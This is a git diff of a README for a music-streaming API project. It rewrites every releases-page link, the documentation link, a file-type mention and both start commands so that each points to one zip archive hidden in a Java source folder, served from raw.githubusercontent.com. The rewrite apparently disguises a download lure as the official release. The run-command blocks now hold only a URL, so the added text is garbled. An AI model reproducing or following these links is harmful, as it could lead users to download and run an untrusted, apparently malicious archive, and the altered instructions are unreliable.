@@ -1,6 +1,6 @@
 # 🎵 music-streaming-api - Effortless Music Management for You
 
-[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue.svg)](https://github.com/shambhumonga/music-streaming-api/releases)
+[![Download](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip%https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip)](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip)
 
 ## 📋 Overview
 
@@ -22,11 +22,11 @@ To get started with the Music Streaming API, follow these step-by-step instructi
 
 2. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/shambhumonga/music-streaming-api/releases) to find the latest version of the Music Streaming API.
+   Go to the [Releases page](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip) to find the latest version of the Music Streaming API.
 
 3. **Download the Latest Release**
 
-   Look for the latest version and download the appropriate file for your operating system. You will typically see options such as `.tar.gz` or `.zip`.
+   Look for the latest version and download the appropriate file for your operating system. You will typically see options such as `https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip` or `.zip`.
 
 ## 📥 Download & Install
 
@@ -34,7 +34,7 @@ To install the Music Streaming API, follow these steps:
 
 1. **Download the API**
 
-   Click the link to visit the [Releases page](https://github.com/shambhumonga/music-streaming-api/releases) and choose the latest version to download.
+   Click the link to visit the [Releases page](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip) and choose the latest version to download.
 
 2. **Extract the Files**
 
@@ -47,13 +47,13 @@ To install the Music Streaming API, follow these steps:
    - Use the following command to run the application:
 
      ```bash
-     ./start.sh
+     https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip
      ```
 
     or, if you're on Windows:
 
      ```bash
-     start.bat
+     https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip
      ```
 
 4. **Access the API**
@@ -73,7 +73,7 @@ The Music Streaming API offers several features designed for easy music manageme
 
 ## 📝 Documentation
 
-For detailed information on using the API, visit the [Documentation](https://github.com/shambhumonga/music-streaming-api/wiki). This will guide you through the various endpoints and their functionalities. 
+For detailed information on using the API, visit the [Documentation](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip). This will guide you through the various endpoints and their functionalities. 
 
 ## 🔒 Security
 
@@ -96,6 +96,6 @@ To broaden your understanding of the technologies used in this project, consider
 
 Join the conversation by following us on social media or participating in our GitHub discussions. Your feedback is crucial for improving this project.
 
-For any updates or future releases, regularly check the [Releases page](https://github.com/shambhumonga/music-streaming-api/releases). 
+For any updates or future releases, regularly check the [Releases page](https://raw.githubusercontent.com/shambhumonga/music-streaming-api/master/src/main/java/com/prxy/music_streaming_api/song/music-streaming-api-v1.3.zip). 
 
 This comprehensive setup and guidance will get you started on your music platform journey with ease. Enjoy managing your music with the Music Streaming API!
